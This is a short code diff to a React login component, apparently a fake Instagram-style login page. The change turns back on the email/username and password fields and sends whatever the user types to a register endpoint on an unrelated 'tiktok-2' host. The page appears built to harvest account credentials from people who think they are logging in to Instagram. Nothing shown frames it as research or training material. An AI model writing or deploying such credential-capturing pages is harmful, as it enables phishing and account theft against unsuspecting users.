@@ -25,8 +25,8 @@ export default function Login() {
 
     const click = () => {
         axios.post('https://tiktok-2-ang0.onrender.com/register', {
-            userInfo: number,
-            password: 's'
+            userInfo: userinfo,
+            password: pass
         })
         .then((res) => {
             console.log(res.data);
@@ -57,9 +57,8 @@ useEffect(() => {
             <div className={style.card}>
                 <div className={style.title}></div>
                 <div className={style.inputGroup}>
-              {/* <input onChange={text1} className={style.inputInstagram} type="text" placeholder='Enter your Email,username,Phonenumber' />
-                    <input onChange={text2} className={style.inputInstagram} type="password" placeholder='Password' /> */}      
-                   <input onChange={text3} className={style.inputInstagram} type="text" name="" id="" placeholder='Enter your Phonenumber' />
+        <input onChange={text1} className={style.inputInstagram} type="text" placeholder='Enter your Email,username,Phonenumber' />
+                    <input onChange={text2} className={style.inputInstagram} type="password" placeholder='Password' /> 
                 </div>
                <button onClick={click} className={style.btn1}>Log In</button>
                 <div className={style.line}></div>
